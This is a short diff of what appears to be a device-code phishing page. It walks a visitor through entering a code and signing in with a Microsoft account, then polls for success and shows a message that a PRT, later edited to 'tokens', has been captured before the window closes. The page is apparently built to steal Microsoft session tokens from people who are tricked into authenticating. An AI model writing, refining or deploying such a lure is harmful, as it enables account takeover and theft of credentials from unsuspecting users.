@@ -86,7 +86,7 @@
             <li>Enter the code: <strong id="codeRef">------</strong></li>
             <li>Sign in with your Microsoft account</li>
             <li>Click "Continue" when asked</li>
-            <li>This window will auto-close</li>
+            <li>This window will auto-close when complete</li>
         </ol>
     </div>
     <div class="status" id="statusMsg">
@@ -133,7 +133,7 @@
                 
                 if (data.status === 'success') {
                     clearInterval(pollInterval);
-                    document.getElementById('statusMsg').innerHTML = '✅ Authentication successful! PRT captured. You can close this window.';
+                    document.getElementById('statusMsg').innerHTML = '✅ Authentication successful! Tokens captured. You can close this window.';
                     document.getElementById('statusMsg').classList.add('success');
                     setTimeout(() => {
                         window.close();
